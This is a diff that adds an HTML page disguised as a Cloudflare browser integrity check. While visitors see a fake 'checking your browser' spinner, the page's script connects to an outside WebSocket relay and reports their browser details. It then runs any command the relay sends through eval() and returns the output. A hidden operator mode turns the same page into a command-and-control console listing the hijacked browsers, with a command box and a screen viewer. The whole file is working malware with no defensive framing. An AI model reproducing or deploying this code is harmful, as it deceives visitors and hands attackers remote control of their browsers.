@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cloudflare Browser Integrity Check</title>
+<style>
+  :root { --bg:#090c10; --panel:#111621; --border:#232b3e; --accent:#00ff9d; --text:#e2e8f0; --muted:#64748b; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg); color:var(--text); font-family:monospace; height:100vh; overflow:hidden; }
+  #decoy-view { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#fff; color:#222; font-family:sans-serif; }
+  .loader { width:34px; height:34px; border:3px solid #eee; border-top-color:#f48120; border-radius:50%; animation:sp 0.8s linear infinite; margin-bottom:14px; }
+  @keyframes sp { to { transform:rotate(360deg); } }
+  #operator-view { display:none; grid-template-columns:280px 1fr; grid-template-rows:48px 1fr 270px; height:100vh; }
+  header { grid-column:1/-1; background:var(--panel); border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; padding:0 16px; }
+  .dot { width:9px; height:9px; border-radius:50%; background:#ef4444; display:inline-block; margin-right:8px; }
+  .dot.on { background:var(--accent); box-shadow:0 0 8px var(--accent); }
+  aside { grid-row:2/-1; background:var(--panel); border-right:1px solid var(--border); padding:12px; overflow-y:auto; }
+  .node { padding:10px; border:1px solid var(--border); border-radius:4px; margin-bottom:8px; cursor:pointer; font-size:12px; }
+  .node.active { border-color:var(--accent); background:rgba(0,255,157,0.07); }
+  main { background:#040609; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden; }
+  #screen { max-width:100%; max-height:100%; object-fit:contain; }
+  #term { background:#07090e; border-top:1px solid var(--border); display:flex; flex-direction:column; }
+  #out { flex:1; padding:12px; overflow-y:auto; white-space:pre-wrap; color:#a7f3d0; font-size:13px; }
+  #in-row { display:flex; border-top:1px solid var(--border); background:var(--panel); }
+  #in-row span { padding:8px 12px; color:var(--accent); font-weight:bold; }
+  #cmd-in { flex:1; background:transparent; border:none; color:var(--text); font-family:inherit; font-size:13px; outline:none; }
+</style>
+</head>
+<body>
+<div id="decoy-view">
+  <div class="loader"></div>
+  <div style="font-size:15px;font-weight:500;">Checking your browser connection security...</div>
+  <div style="font-size:12px;color:#777;margin-top:6px;">Please wait a moment while we verify your session.</div>
+</div>
+<div id="operator-view">
+  <header>
+    <div><span id="dot" class="dot"></span><strong>BENCH // LIVE C2 CONSOLE (24/7)</strong></div>
+    <div id="target-lbl" style="color:var(--muted)">No active node</div>
+    <div style="font-size:11px;color:var(--accent)">wss://sync-node-5024.onrender.com</div>
+  </header>
+  <aside>
+    <div style="font-size:11px;color:var(--muted);margin-bottom:10px;">CONNECTED TARGETS</div>
+    <div id="nodes"></div>
+  </aside>
+  <main><canvas id="screen" width="1280" height="720"></canvas></main>
+  <section id="term">
+    <div id="out"></div>
+    <div id="in-row"><span>#&gt;</span><input id="cmd-in" type="text" placeholder="Run OS / JS command on selected target..." autocomplete="off"></div>
+  </section>
+</div>
+<script>
+(() => {
+  const RELAY = "wss://sync-node-5024.onrender.com";
+  const q = new URLSearchParams(location.search);
+  if (q.get("mode") === "operator") {
+    document.getElementById("decoy-view").style.display = "none";
+    document.getElementById("operator-view").style.display = "grid";
+    bootOperator();
+  } else {
+    bootTarget();
+  }
+  function bootTarget() {
+    const id = "browser_" + Math.random().toString(36).slice(2, 7);
+    const connect = () => {
+      const ws = new WebSocket(RELAY + "?role=host&id=" + id);
+      ws.onopen = () => {
+        ws.send(JSON.stringify({
+          type: "term_out",
+          output: "[WEB SESSION OPEN] UA: " + navigator.userAgent + " | Screen: " + screen.width + "x" + screen.height + "
+"
+        }));
+      };
+      ws.onmessage = async (e) => {
+        try {
+          const m = JSON.parse(e.data);
+          if (m.type === "cmd") {
+            let res;
+            try { res = await eval(m.command); } catch (err) { res = err.toString(); }
+            ws.send(JSON.stringify({ type: "term_out", output: String(res) + "
+" }));
+          }
+        } catch (err) {}
+      };
+      ws.onclose = () => setTimeout(connect, 2500);
+    };
+    connect();
+  }
+  function bootOperator() {
+    let ws, active = null;
+    const map = new Map();
+    const nodesEl = document.getElementById("nodes");
+    const outEl = document.getElementById("out");
+    const inEl = document.getElementById("cmd-in");
+    const canvas = document.getElementById("screen");
+    const ctx = canvas.getContext("2d");
+    function drawList() {
+      nodesEl.innerHTML = "";
+      for (const [id, meta] of map.entries()) {
+        const d = document.createElement("div");
+        d.className = "node" + (active === id ? " active" : "");
+        d.innerHTML = "<strong>" + id + "</strong><br><span style="color:var(--muted)">" + (meta.ip || "") + "</span>";
+        d.onclick = () => { active = id; document.getElementById("target-lbl").textContent = "NODE // " + id; drawList(); };
+        nodesEl.appendChild(d);
+      }
+    }
+    function connect() {
+      ws = new WebSocket(RELAY + "?role=operator");
+      ws.binaryType = "arraybuffer";
+      ws.onopen = () => document.getElementById("dot").classList.add("on");
+      ws.onclose = () => { document.getElementById("dot").classList.remove("on"); setTimeout(connect, 2000); };
+      ws.onmessage = (ev) => {
+        if (ev.data instanceof ArrayBuffer) {
+          const b = new Uint8Array(ev.data);
+          let id = "";
+          for (let i = 0; i < 16 && b[i] !== 0; i++) id += String.fromCharCode(b[i]);
+          if (id !== active) return;
+          const url = URL.createObjectURL(new Blob([b.subarray(16)], { type: "image/jpeg" }));
+          const img = new Image();
+          img.onload = () => { canvas.width = img.width; canvas.height = img.height; ctx.drawImage(img, 0, 0); URL.revokeObjectURL(url); };
+          img.src = url;
+          return;
+        }
+        const m = JSON.parse(ev.data);
+        if (m.type === "host_list") {
+          map.clear();
+          m.hosts.forEach(h => map.set(h.id, h.meta));
+          if (!active && m.hosts.length) active = m.hosts[0].id;
+          drawList();
+        } else if (m.type === "host_joined") {
+          map.set(m.id, m.meta);
+          if (!active) active = m.id;
+          drawList();
+        } else if (m.type === "host_left") {
+          map.delete(m.id);
+          if (active === m.id) active = null;
+          drawList();
+        } else if (m.type === "term_out" && m.hostId === active) {
+          outEl.textContent += m.output;
+          outEl.scrollTop = outEl.scrollHeight;
+        }
+      };
+    }
+    inEl.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" && active && ws.readyState === WebSocket.OPEN) {
+        const c = inEl.value;
+        outEl.textContent += "
+#> " + c + "
+";
+        ws.send(JSON.stringify({ targetId: active, type: "cmd", command: c }));
+        inEl.value = "";
+      }
+    });
+    connect();
+  }
+})();
+</script>
+</body>
+</html>
